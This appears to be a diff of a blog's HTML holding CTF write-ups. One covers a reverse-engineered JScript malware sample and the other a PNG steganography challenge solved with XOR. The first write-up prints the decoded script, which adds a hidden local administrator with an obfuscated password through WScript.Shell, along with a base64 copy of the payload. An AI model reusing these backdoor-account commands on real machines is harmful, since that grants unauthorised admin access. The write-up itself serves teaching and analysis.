+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">var</span> <span class="n">e</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">e</span> <span class="o">&lt;</span> <span class="n">d</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">e</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">var</span> <span class="n">f</span> <span class="o">=</span> <span class="n">d</span><span class="p">[</span><span class="n">e</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="o">/^</span><span class="err">\</span><span class="n">s</span><span class="o">+|</span><span class="err">\</span><span class="n">s</span><span class="o">+</span><span class="err">$</span><span class="o">/</span><span class="n">g</span><span class="p">,</span> <span class="err">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="err">&#39;</span><span class="n">begin</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">f</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="err">&#39;</span><span class="n">end</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">f</span> <span class="o">===</span> <span class="err">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">var</span> <span class="n">g</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mi">32</span> <span class="o">&amp;</span> <span class="mi">63</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="n">var</span> <span class="n">h</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">h</span> <span class="o">&lt;</span> <span class="n">f</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">h</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">h</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">&gt;=</span> <span class="n">f</span><span class="p">.</span><span class="n">length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="n">var</span> <span class="n">i</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="n">h</span><span class="p">)</span> <span class="o">-</span> <span class="mi">32</span> <span class="o">&amp;</span> <span class="mi">63</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="n">h</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">32</span> <span class="o">&amp;</span> <span class="mi">63</span><span class="p">,</span> <span class="n">k</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="n">h</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mi">32</span> <span class="o">&amp;</span> <span class="mi">63</span><span class="p">,</span> <span class="n">l</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="n">h</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mi">32</span> <span class="o">&amp;</span> <span class="mi">63</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="n">c</span> <span class="o">+=</span> <span class="n">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="n">j</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">h</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">&lt;</span> <span class="n">f</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="n">c</span> <span class="o">+=</span> <span class="n">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">((</span><span class="n">j</span> <span class="o">&amp;</span> <span class="mi">15</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="n">k</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">h</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">&lt;</span> <span class="n">f</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="n">c</span> <span class="o">+=</span> <span class="n">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">((</span><span class="n">k</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="n">l</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">c</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">g</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">var</span> <span class="n">m</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">begin</span> <span class="mi">644</span> <span class="o">-</span><span class="err">\</span><span class="n">nG9FQA9WLY</span><span class="mf">.3</span><span class="p">(</span><span class="nf">R9F</span><span class="p">(</span><span class="n">R</span><span class="p">,</span><span class="mi">6</span><span class="o">%</span><span class="n">A9C</span><span class="err">$</span><span class="n">W</span><span class="o">-</span><span class="mi">3</span><span class="o">=</span><span class="n">E</span><span class="p">,</span><span class="nf">V9D8C</span><span class="p">(</span><span class="n">X9</span><span class="err">#</span><span class="o">&lt;</span><span class="n">X</span><span class="mf">.3</span><span class="o">!</span><span class="n">A</span><span class="o">-</span><span class="mi">60</span><span class="n">Y</span><span class="p">,</span><span class="n">WT</span><span class="o">*</span><span class="err">\</span><span class="n">n</span><span class="err">`\</span><span class="n">nend</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">var</span> <span class="n">n</span> <span class="o">=</span> <span class="nf">a</span><span class="p">(</span><span class="n">m</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">var</span> <span class="n">o</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">	<span class="err">&#39;</span><span class="n">net</span> <span class="n">user</span> <span class="n">LocalAdministrator</span> <span class="err">&#39;</span> <span class="o">+</span> <span class="n">n</span> <span class="o">+</span> <span class="err">&#39;</span> <span class="o">/</span><span class="n">add</span><span class="err">&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="err">&#39;</span><span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span> <span class="n">LocalAdministrator</span> <span class="o">/</span><span class="n">add</span><span class="err">&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="err">&#39;</span><span class="n">calc</span><span class="p">.</span><span class="n">exe</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="n">var</span> <span class="n">p</span> <span class="o">=</span> <span class="n">new</span> <span class="nf">ActiveXObject</span><span class="p">(</span><span class="err">&#39;</span><span class="n">WScript</span><span class="p">.</span><span class="n">Shell</span><span class="err">&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="n">var</span> <span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">q</span> <span class="o">&lt;</span> <span class="n">o</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">q</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="p">.</span><span class="nf">Run</span><span class="p">(</span><span class="n">o</span><span class="p">[</span><span class="n">q</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="nf">Run</span><span class="p">(</span><span class="n">o</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
+</span></span></code></pre></div><p>We see that the variable &rsquo;n&rsquo;, which is the password for the new admin being added by the strange net commands we saw before, is the result of decoding the string in variable &rsquo;m&rsquo; by using the &lsquo;a&rsquo; function. So, we just need to decode the &rsquo;m&rsquo; string. Instead of doing that manually, we can change the script to print us the &rsquo;n&rsquo; variable after the string is decoded. Also, we should delete all the malicious commands that would create a new admin on our system.<br>
+Printing the password using <code>WScript.Echo(n);</code> we get the flag printed out.</p>
+<p>Flag: <code>flag{9922fb21aaf1757e3fdb28d7890a5d93}</code></p>
+<h3 id="alternative-solution-1">Alternative Solution</h3>
+<p>Another way to do this, instead of using the sandbox, is to check the output of DIE (Detect It Easy). This tells us that the exe was built using AutoIt 3.4.9. We can find online that there is a tool to change exes back into AutoIt files, and it&rsquo;s called Exe2Aut.exe. After we use that, we get an AutoIt script file that we can read normally with a text editor. In line 13 of the script, we find a string that is base64 encoded.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">I0B+XmNRTUFBQT09VyF4XkRrS3hQbWAoYgk3bC5QMSdFRUJOJyggL2FWa0RjRS0JSippV1cuYzdsLlB/eCFwK0AhW2NWK1VMRHRJKzNRKgktbUQsMCc5JH9EUk0rMlZtbW5jSjcta1F1Jy9fZiZMfkVCKmlyMGNXY2tVTn9hcjZgRTh/b2tVRSoneCdaay0wIGJ4OSs2fTB2RSsJTkUjeyd4VC11MHt4J3JKIzFHVVlieCErSVxDLixveGA2IG00bC4vS04rKU92IWJPMisqW38yaTZXRHZcbS5QNCdxaTRAIVcgXit4VE90cHRfeypiCWIwdnRRJkAqeDZScysJTFk0Izguf2wzSS1tRH5re2M2Ul40bE1aVzkrek9gNCNSJnkjJ38yfkx7YzBjbXRtLi9XOSt6WWN0UXEqT2YgKid2Mn5WeHYwUl40bUQvVzluelljNF95I08yICondjJ+cyd2MCBeNGxEO0dOf2JZdjRRJipPMiBiW39mcG1RJ1VPRGJ4TCA2RFdoLzRsLlpLW39gY2JAIUAhICMtYE5AKkAqVyNiaWIwYzQzIEAhNiBWf3hvRDRSRiptMydqWS5yCW8gME1HOjt0Qy47V05uY3ZgJVs4WCpAIUAhVyMtYDNAKkAqeWIjcGtXYDRfZkAhNlJWf1VvRHRPOGJeX3s/RERyeEwgNkRHOjs0bE1aR1t/YGBjVkwmYkAhQCF/KnVzKjgpRCtERU1VUDFSZEUoL08uYnhvdlR+VCM4N0MuUHMncjRub3JVLHYqYyxSLQlNMW81YiwJSklSZmAiMXdgXUJ2dWIsO15xUiZ7MlMuT2YwL3YoLFtAIShjJiJ6Un8hSX5xS00tVXwneG54OUVpN2wufgknbGNoKmktbE1+Sycscnh/WVAhL38uUGRXXmxeYltoYnhra09EbVlXTX5FXwlfclAmbFtbcn5FeH9PUF5XXkNeb0RHO2FQQ05zcglrZEREbVlXTS8sSlcxbHNiOTpyVWIvWU1DWUtEUEpDW05yfnJtQ1ZeIH82bkpZSVxtRH4ye3grQX56bU9rN25vcjhOKzFZYEV/VV5EYndPUlV0bnNeQiNwV1dNYFxtLn47eyFwO0AhVyBzf3hMWTRSRnA7UVEqCXcgXSF4Y1ddNVl+VEIwbVYvfyMpMlIiRVVgSyQrREJGfjZDVmsrI3A0UkFCQUE9PV4jfkA<span class="o">=</span>
+</span></span></code></pre></div><p>When we decode that string, we get the binary data of the .jse file we talked about before. Decoding it again and then using <code>WScript.Echo(n);</code> we can print the flag.</p>
+<hr>
+<h1 id="oceanlocust">OceanLocust</h1>
+<p><strong>Challenge</strong> Author: @JohnHammond<br>
+<strong>Tagline</strong> <em>“Wow-ee zow-ee!! Some advanced persistent threats have been doing some tricks with hiding payloads in image files!”</em></p>
+<h2 id="oceanlocust-solution">OceanLocust Solution</h2>
+<p>I have to admit, I wasted a lot of time on this one, making the attempt to reverse engineer the binary. Obviously, considering this is a reverse engineering challenge. But in the end, I solved it fully dynamically, with the good old trial and error. It&rsquo;s possibly not the most efficient method but eventually, I got the flag&hellip;</p>
+<p>Since we have the binary that encoded the flag into the image and can execute it ourself to encode new data into an image of our choosing I tried to figure out what exactly changed when creating an image. Thus, I made an empty PNG image for myself to serve as a source. I then encoded a flag from a challenge I&rsquo;d done before. This was simply to have a similar amount of data as I would expect. However, upon comparing, it seemed that the whole image, apart from the PNG header, had changed. This wasn&rsquo;t of much help. Even when encoding the same flag in the identical source image several times, there were major differences each time.</p>
+<p>To me, this seemed more like a steganography challenge now. Accordingly, I turned to the &ldquo;CTF Image Steganography Checklist&rdquo; and started going through the steps listed there.<br>
+<a href="https://georgeom.net/StegOnline/checklist">https://georgeom.net/StegOnline/checklist</a></p>
+<p>Point 5 instructs us to execute:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pngcheck -vtp7 1_encoded_empty.png
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zlib warning:  different version <span class="o">(</span>expected 1.2.13, using 1.3.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">File: 1_encoded_empty.png <span class="o">(</span><span class="m">181</span> bytes<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  chunk IHDR at offset 0x0000c, length <span class="m">13</span>
+</span></span><span class="line"><span class="cl">    <span class="m">1</span> x <span class="m">1</span> image, 32-bit RGB+alpha, non-interlaced
+</span></span><span class="line"><span class="cl">  chunk biTa at offset 0x00025, length <span class="m">5</span>
+</span></span><span class="line"><span class="cl">    unknown private, ancillary, safe-to-copy chunk
+</span></span><span class="line"><span class="cl">  chunk biTg at offset 0x00036, length <span class="m">5</span>
+</span></span><span class="line"><span class="cl">    unknown private, ancillary, safe-to-copy chunk
+</span></span><span class="line"><span class="cl">  chunk biTh at offset 0x00047, length <span class="m">5</span>
+</span></span><span class="line"><span class="cl">    unknown private, ancillary, safe-to-copy chunk
+</span></span><span class="line"><span class="cl">  chunk biTb at offset 0x00058, length <span class="m">5</span>
+</span></span><span class="line"><span class="cl">    unknown private, ancillary, safe-to-copy chunk
+</span></span><span class="line"><span class="cl">  chunk biTe at offset 0x00069, length <span class="m">5</span>
+</span></span><span class="line"><span class="cl">    unknown private, ancillary, safe-to-copy chunk
+</span></span><span class="line"><span class="cl">  chunk biTc at offset 0x0007a, length <span class="m">5</span>
+</span></span><span class="line"><span class="cl">    unknown private, ancillary, safe-to-copy chunk
+</span></span><span class="line"><span class="cl">  chunk biTf at offset 0x0008b, length <span class="m">5</span>
+</span></span><span class="line"><span class="cl">    unknown private, ancillary, safe-to-copy chunk
+</span></span><span class="line"><span class="cl">  chunk biTd at offset 0x0009c, length <span class="m">5</span>
+</span></span><span class="line"><span class="cl">    unknown private, ancillary, safe-to-copy chunk
+</span></span><span class="line"><span class="cl">  chunk IEND at offset 0x000ad, length 0:  no IDAT chunks
+</span></span><span class="line"><span class="cl">ERRORS DETECTED in 1_encoded_empty.png
+</span></span></code></pre></div><p>Those biT* chunks seem a bit weird. They are present in every image I generate but are almost always ordered differently. Also they don&rsquo;t seem to be default chunks of PNG files. As my online research didn&rsquo;t really tell me anything about them. So I dug deeper into those chunks trying to figure out what they are doing. Next I try to encode only &ldquo;A&rdquo; characters in the length of a flag (38) to see where exactly our data is stored. But the data just seems to be random in there, since I don&rsquo;t find my expected pattern of 38 identical hex chars. Therefore I guess our content has to be encrypted in some form.</p>
+<p>To figure out what is going on I try to use the magic receipt of CyberChef. But first to extract the chunks I used the online tool <a href="https://www.nayuki.io/page/png-file-chunk-inspector">png-file-chunk-inspector</a>.<br>
+For example the chunk of biTa would give us a byte sequence looking like this:<br>
+<code>00 00 00 05 62 69 54 61 23 28 15 20 9d c5 69 88</code><br>
+Where the first 8 bytes would be identical for all of the biT* chunks. Therefore they are probably irrelevant when we try to find the string encoded in them. After those we got a couple of bytes that likely contain our data. Because for the last 4 bytes the chunk inspector tells us that it&rsquo;s the CRC Checksum. In the previous example our data is stored in the following bytes:<br>
+<code>23 28 15 20</code> and that across all the biT* sections.</p>
+<p>When only pasting this data into the magic receipt of CyberChef, the chunks sorted alphabetically by the biT* character, we get a hit on the XOR encryption. Where the used key is defined as <code>0x41</code> but the decrypted text is just some gibberish<br>
+<code>biTabbiTbbbiTcbbiTdbbiTebbiTfbbiTgbbiT</code><br>
+that looks similar to the chunk names. And now we get to the part where I wasted way too much time, until I remembered what XOR is. With the Key <code>0x41</code> I didn&rsquo;t find the actual XOR key used by the application to encode our data but the character I entered for encoding. Therefore the gibberish string I got has to be the XOR Key used to encrypt the data.</p>
+<p>Let&rsquo;s try it on the image we got that contains the actual flag. All the extracted chunks are as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">a: <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">05</span> <span class="m">62</span> <span class="m">69</span> <span class="m">54</span> <span class="m">61</span> <span class="m">04</span> <span class="m">05</span> <span class="m">35</span> <span class="m">06</span> <span class="m">19</span> 9d c5 <span class="m">69</span> <span class="m">88</span>
+</span></span><span class="line"><span class="cl">b: <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">05</span> <span class="m">62</span> <span class="m">69</span> <span class="m">54</span> <span class="m">62</span> <span class="m">04</span> 0c <span class="m">37</span> 5a <span class="m">55</span> 0c b9 9f <span class="m">21</span>
+</span></span><span class="line"><span class="cl">c: <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">05</span> <span class="m">62</span> <span class="m">69</span> <span class="m">54</span> <span class="m">63</span> <span class="m">01</span> 5f 6d <span class="m">53</span> <span class="m">00</span> 7d <span class="m">55</span> d6 ec
+</span></span><span class="line"><span class="cl">d: <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">05</span> <span class="m">62</span> <span class="m">69</span> <span class="m">54</span> <span class="m">64</span> 5a 0c <span class="m">37</span> 5c <span class="m">06</span> f9 fb aa 5e
+</span></span><span class="line"><span class="cl">e: <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">05</span> <span class="m">62</span> <span class="m">69</span> <span class="m">54</span> <span class="m">65</span> <span class="m">54</span> 5c <span class="m">36</span> 5d <span class="m">00</span> b7 <span class="m">20</span> <span class="m">36</span> 7b
+</span></span><span class="line"><span class="cl">f: <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">05</span> <span class="m">62</span> <span class="m">69</span> <span class="m">54</span> <span class="m">66</span> <span class="m">00</span> <span class="m">58</span> <span class="m">64</span> <span class="m">03</span> <span class="m">07</span> a6 <span class="m">21</span> a5 2e
+</span></span><span class="line"><span class="cl">g: <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">05</span> <span class="m">62</span> <span class="m">69</span> <span class="m">54</span> <span class="m">67</span> <span class="m">55</span> 0b <span class="m">36</span> <span class="m">51</span> <span class="m">57</span> c8 e8 <span class="m">02</span> <span class="m">80</span>
+</span></span><span class="line"><span class="cl">h: <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">05</span> <span class="m">62</span> <span class="m">69</span> <span class="m">54</span> <span class="m">68</span> <span class="m">06</span> <span class="m">59</span> <span class="m">29</span> c2 c8 0a af <span class="m">71</span> <span class="m">26</span>
+</span></span></code></pre></div><p>Extracting the relevant bytes and therefore excluding the chunks&rsquo; start and CRC:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="m">04</span> <span class="m">05</span> <span class="m">35</span> <span class="m">06</span> <span class="m">19</span>
+</span></span><span class="line"><span class="cl"><span class="m">04</span> 0c <span class="m">37</span> 5a <span class="m">55</span>
+</span></span><span class="line"><span class="cl"><span class="m">01</span> 5f 6d <span class="m">53</span> <span class="m">00</span>
+</span></span><span class="line"><span class="cl">5a 0c <span class="m">37</span> 5c <span class="m">06</span>
+</span></span><span class="line"><span class="cl"><span class="m">54</span> 5c <span class="m">36</span> 5d <span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="m">00</span> <span class="m">58</span> <span class="m">64</span> <span class="m">03</span> <span class="m">07</span>
+</span></span><span class="line"><span class="cl"><span class="m">55</span> 0b <span class="m">36</span> <span class="m">51</span> <span class="m">57</span>
+</span></span><span class="line"><span class="cl"><span class="m">06</span> <span class="m">59</span> <span class="m">29</span>
+</span></span></code></pre></div><p>And we get our flag printed out nicely.<br>
+<a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'biTabbiTbbbiTcbbiTdbbiTebbiTfbbiTgbbiT'%7D,'Standard',false)&amp;input=MDQgMDUgMzUgMDYgMTkKMDQgMGMgMzcgNWEgNTUKMDEgNWYgNmQgNTMgMDAKNWEgMGMgMzcgNWMgMDYKNTQgNWMgMzYgNWQgMDAKMDAgNTggNjQgMDMgMDcKNTUgMGIgMzYgNTEgNTcKMDYgNTkgMjk&amp;oeol=FF">CyberChef Receipt</a></p>
+<p>Flag: <code>flag{fec87c690b8ec8d65b8bb10ee7bb65d0}</code></p>
+
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+        <span>
+            © 2025 XeroExecute Blog, Built with
+            <a href="https://gohugo.io" class="footerLink">Hugo</a> and
+            <a href="https://github.com/LordMathis/hugo-theme-nightfall" class="footerLink">Nightfall</a> theme
+        </span>
+    
+</footer>
+    </div>
+
+</body>
+
+</html>
